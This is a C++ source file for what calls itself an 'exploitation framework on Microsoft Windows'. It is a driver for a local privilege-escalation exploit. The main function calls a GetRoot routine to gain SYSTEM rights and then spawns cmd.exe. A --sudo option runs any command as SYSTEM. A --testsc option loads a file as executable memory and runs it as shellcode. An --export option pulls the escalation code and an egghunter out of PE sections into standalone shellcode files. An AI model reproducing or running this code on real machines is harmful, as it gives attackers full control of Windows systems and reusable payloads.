#include <tchar.h>
#include <Windows.h>
#include "Utils\crt.h"
#include <stdio.h>
#include "EoP.h"
#include <string>

extern ENVIRONMENT g_Environment;
extern WINAPI_TABLE g_vtable;
extern STRING_TABLE g_stringtable;

LPVOID LoadDataToMem( __in LPCSTR lpFileName, __in DWORD flProtect = PAGE_READWRITE)
{
	LPBYTE lpMem = NULL;
	HANDLE hFile = CreateFileA(lpFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		DWORD dwFileSize = GetFileSize(hFile, NULL);
		if (dwFileSize != INVALID_FILE_SIZE)
		{
			lpMem = (LPBYTE)VirtualAlloc(NULL, dwFileSize, MEM_COMMIT| MEM_RESERVE, flProtect );
			if (lpMem)
			{
				DWORD dwRead;

				if (ReadFile(hFile, lpMem, dwFileSize, &dwRead, NULL) == FALSE || 
					dwRead != dwFileSize)
				{
					VirtualFree(lpMem, 0, MEM_RELEASE);
					lpMem = NULL;
				}
			}
		}
		CloseHandle(hFile);
	}

	return lpMem;
}

typedef DWORD (WINAPI *SC)();

LPVOID ScanDumpedMemoryForTag(__in LPBYTE lpPattern, __in DWORD cbPatternSize, __in ULONG_PTR pBegin /*= 0x1000*/, __in ULONG_PTR cbSize /*= 0*/)
{	
	for (ULONG_PTR p = pBegin; p ; p = (p | 0xfff) + 1)
	{

VERIFY_ADDRESS:
		if (cbSize != 0)
		{
			if (p >= pBegin + cbSize)
				break;
		}

		if (IsBadReadPtr((LPVOID)p, cbPatternSize))
		{
			continue;
		}
		if (!__STRNCMPI__((LPSTR)p, (LPSTR)lpPattern, cbPatternSize))
			return (LPVOID)p;
		else
		{
			p++;
			goto VERIFY_ADDRESS;
		}
	}
	return (LPVOID)NULL;
}

DWORD_PTR Va2Raw(LPVOID lpImage, LPVOID lpAddress)
{
	PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)lpImage;
	PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)((LPBYTE)pDosHdr + pDosHdr->e_lfanew);
	PIMAGE_SECTION_HEADER pSectionHdr = (PIMAGE_SECTION_HEADER)(pNtHdrs + 1);

	DWORD_PTR dwRVA = (ULONG_PTR)lpAddress - (ULONG_PTR)GetModuleHandle(NULL);
	
	for (UINT i = 0; i < pNtHdrs->FileHeader.NumberOfSections; i++, pSectionHdr++)
	{
		if (pSectionHdr->VirtualAddress <= dwRVA && dwRVA < (pSectionHdr->VirtualAddress + pSectionHdr->Misc.VirtualSize))
		{
			return (dwRVA - pSectionHdr->VirtualAddress + pSectionHdr->PointerToRawData);
		}
	}

	return 0;
}

void DumpSectionToFile(LPCSTR lpFileName, LPSTR lpSectionName, LPVOID lpEntryPoint)
{
	DWORD dwOut;
	// dump shell code to file
	LPSTR strSelfName = (LPSTR) malloc(0x1000);
	GetModuleFileNameA(GetModuleHandle(NULL), strSelfName, 0x1000);

	HANDLE hFile = CreateFileA(strSelfName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		exit(printf("[!!] CreateFile: %08x\n", GetLastError()));

	DWORD dwFileSize = GetFileSize(hFile, NULL);
	LPBYTE lpBuffer = (LPBYTE) malloc(dwFileSize);
	if (!ReadFile(hFile, lpBuffer, dwFileSize, &dwOut, NULL))
		exit(printf("[!!] ReadFile: %08x\n", GetLastError()));
	CloseHandle(hFile);

	hFile = CreateFileA(lpFileName, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		exit(printf("[!!] CreateFile: %08x\n", GetLastError()));

	printf("\nWriting to file %s ...\n", lpFileName);
	PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER) lpBuffer;
	PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS) ((LPBYTE)pDosHdr + pDosHdr->e_lfanew);
	PIMAGE_SECTION_HEADER pSectionHdr = (PIMAGE_SECTION_HEADER) (pNtHdrs + 1);
	DWORD dwTotal  = 0;
	DWORD dwCodeSize = 0;
	DWORD dwEntryPointOffset = 0;
	DWORD_PTR dwRVA = (ULONG_PTR)lpEntryPoint - (ULONG_PTR)GetModuleHandle(NULL);
	printf(" function RVA = 0x%08x\n", dwRVA);
	DWORD dwGetRootOffset = 0;
	DWORD dwEggTagOffset = 0;
	LPBYTE lpTaggedDataInMem = NULL;
	LPBYTE lpTaggedData = NULL;
	DWORD dwSizeOfTaggedData = 0;
	for (UINT i=0; i<pNtHdrs->FileHeader.NumberOfSections; i++, pSectionHdr++)
	{
		BOOL bCodeSizeCount = FALSE;
		if (!__STRNCMPI__((LPSTR)pSectionHdr->Name, lpSectionName, __STRLEN__(lpSectionName)))
		{
			if (pSectionHdr->VirtualAddress <= dwRVA && dwRVA <(pSectionHdr->VirtualAddress + pSectionHdr->Misc.VirtualSize))
			{
				dwEntryPointOffset = (DWORD)(dwRVA - pSectionHdr->VirtualAddress);
				dwCodeSize = pSectionHdr->SizeOfRawData;
				bCodeSizeCount = TRUE;
			}

			if (!__STRNCMPI__((LPSTR)pSectionHdr->Name, "wineop", __STRLEN__("wineop")))
			{
				// check GetRoot
				{
					DWORD dwGetRootRva = (DWORD)((ULONG_PTR)GetRoot - (ULONG_PTR)GetModuleHandle(NULL));
					if (pSectionHdr->VirtualAddress <= dwGetRootRva && dwGetRootRva < (pSectionHdr->VirtualAddress + pSectionHdr->Misc.VirtualSize))
					{
						dwGetRootOffset = dwTotal + dwGetRootRva - pSectionHdr->VirtualAddress;
					}
				}

				{
					DWORD dwEggTagRva = (DWORD)((ULONG_PTR)EggTag - (ULONG_PTR)GetModuleHandle(NULL));
					if (pSectionHdr->VirtualAddress <= dwEggTagRva && dwEggTagRva < (pSectionHdr->VirtualAddress + pSectionHdr->Misc.VirtualSize))
					{
						dwEggTagOffset = dwTotal + dwEggTagRva - pSectionHdr->VirtualAddress;
					}
				}
			
				DWORD tagcode[2] = {DATA_TAG, DATA_TAG};
				if (lpTaggedData == NULL)
				{
					lpTaggedData = (LPBYTE)ScanDumpedMemoryForTag((LPBYTE)tagcode, sizeof(tagcode), (ULONG_PTR)(lpBuffer + pSectionHdr->PointerToRawData), pSectionHdr->SizeOfRawData);
					if (lpTaggedData)
					{
						if (!bCodeSizeCount)
							dwCodeSize += pSectionHdr->SizeOfRawData;
						lpTaggedDataInMem = lpBuffer + pSectionHdr->PointerToRawData;
						dwSizeOfTaggedData = pSectionHdr->SizeOfRawData;
						continue;
					}
				}
			}

			WriteFile(hFile, lpBuffer + pSectionHdr->PointerToRawData, pSectionHdr->SizeOfRawData, &dwOut, NULL);
			printf("[%s] Copy 0x%08x bytes from @ 0x%08x \n", lpSectionName, dwOut, pSectionHdr->PointerToRawData);
			dwTotal += dwOut;
		}
	}

	if (lpTaggedData && lpTaggedDataInMem && dwSizeOfTaggedData)
	{

		STRING_TABLE *	 lpString = (STRING_TABLE *)((DWORD_PTR)&g_stringtable - (DWORD_PTR)&g_Environment);
		LPWINAPI_TABLE	 lpWinapiTable = (LPWINAPI_TABLE)((DWORD_PTR)&g_vtable - (DWORD_PTR)&g_Environment);
		DWORD dwEntryPointEva = (DWORD)dwGetRootOffset - dwEggTagOffset;
		
		ENVIRONMENT tag =
		{
			DATA_TAG,  DATA_TAG,
			NULL,
			dwEntryPointEva,
			dwCodeSize,
			lpString,
			lpWinapiTable,
		};

		printf("[wineop] Found! Replacing RVA: 0x%08x.\n", dwEntryPointEva);
		printf("[wineop] Code size = 0x%08x \n", dwCodeSize);
		memcpy(lpTaggedData, &tag, sizeof(tag));
		WriteFile(hFile, lpTaggedDataInMem, dwSizeOfTaggedData, &dwOut, NULL);
		dwTotal += dwOut;
	}

	CloseHandle(hFile);

	printf("[%s] Entry point Offset: 0x%08x\n", lpSectionName, dwEntryPointOffset);
	printf("[%s] Shellcode size: 0x%08x\n",lpSectionName, dwTotal);
}

enum
{
	TEST_SC		= 1 << 0,
	EXPORT_SC	= 1 << 1,
	SUDO		= 1 << 2,
	ALL		= TEST_SC | EXPORT_SC | SUDO,
};

void Usage( DWORD code )
{
	printf("\n _    _ _       _____     ______ \n");
	printf("| |  | (_)     |  ___|    | ___ \\\n");
	printf("| |  | |_ _ __ | |__  ___ | |_/ /\n");
	printf("| |/\\| | | '_ \\|  __|/ _ \\|  __/ \n");
	printf("\\  /\\  / | | | | |__| (_) | |    \n");
	printf(" \\/  \\/|_|_| |_\\____/\\___/\\_|    \n");
	printf("\n\n");

	printf("Exploitation framework on Microsoft Windows.\n\n");

	printf("DESCRIPTION\n\n");
	if (TEST_FLAG(code, TEST_SC))
	{
		printf("-t,--testsc shellcode [data]\n");
		printf("\tLoad shellcode to memory and run.\n\n");
	}

	if (TEST_FLAG(code, EXPORT_SC))
	{
		printf("-e,--dump \n");
		printf("\tExport shellcode to file.\n\n");
	}

	if (TEST_FLAG(code, SUDO))
	{
		printf("-sudo,--s \n");
		printf("\tRun a command line with SYSTEM privileges.\n\n");
	}

	if (TEST_FLAG(code, ALL))
	{
		printf("--help, -h, /? \n");
		printf("\tDisplay this help and exit.\n\n");
	}
}

int main(int argc, char **argv)
{
	UNREFERENCED_PARAMETER(argc);
	UNREFERENCED_PARAMETER(argv);

	if (argc == 1)
	{
		printf("Display help message: %s /?\n", argv[0]);
		ENVIRONMENT *env = &g_Environment;
		env->lpCodeEgg = (LPVOID)EggTag;
		env->lpString  = &g_stringtable;
		env->lpWinapiTable = &g_vtable;
		GetRoot(env);
		ShellExecute(NULL, TEXT("open"), TEXT("cmd.exe"), NULL, NULL, SW_SHOW);
		return 0;
	}
	else if (argc > 1)
	{
		if (!_stricmp(argv[1], "--testsc") || 
			!_stricmp(argv[1], "-t"))
		{
			if (argc == 2)
			{
				Usage(TEST_SC);
			}
			else if (argc >= 3)
			{
				if (argc == 4)
				{
					LPVOID lpData = LoadDataToMem(argv[3]);
					if (lpData == NULL)
					{
						printf("The system cannot find the file specified: %s.\n", argv[3]);
					}

					UNREFERENCED_PARAMETER(lpData);
				}

				SC lpShellcode = (SC)LoadDataToMem(argv[2], PAGE_EXECUTE_READWRITE);
				UNREFERENCED_PARAMETER(lpShellcode);
				if (lpShellcode == NULL)
				{
					printf("The system cannot find the file specified: %s.\n", argv[2]);
					return 0;
				}
				lpShellcode();
			}
		}

		else if (
			!_stricmp(argv[1], "--export") || 
			!_stricmp(argv[1], "-e"))
		{
#if defined _M_IX86
			DumpSectionToFile("shellcode_x86", "wineop", GetRoot);
			DumpSectionToFile("egghunt_x86", "eggeop", EggHunting);
#elif defined _M_AMD64
			DumpSectionToFile("shellcode_x64", "wineop", GetRoot);
			DumpSectionToFile("egghunt_x64", "eggeop", EggHunting);
#endif
		}

		else if (
			!_stricmp(argv[1], "--sudo") || 
			!_stricmp(argv[1], "-s"))
		{
			ENVIRONMENT *env = &g_Environment;
			env->lpCodeEgg = (LPVOID)EggTag;
			env->lpString  = &g_stringtable;
			env->lpWinapiTable = &g_vtable;
			GetRoot(env);
			std::string cmd;
			for (int i = 2; i < argc; ++i)
			{

				cmd += argv[i];
				cmd += " ";			
			}
			WinExec(cmd.c_str(), SW_SHOW);
		}

		else if (
			!_stricmp(argv[1], "--help") || 
			!_stricmp(argv[1], "-h") || 
			!_stricmp(argv[1], "/?"))
		{
			Usage(ALL);
		}
	}

	return 0;
}
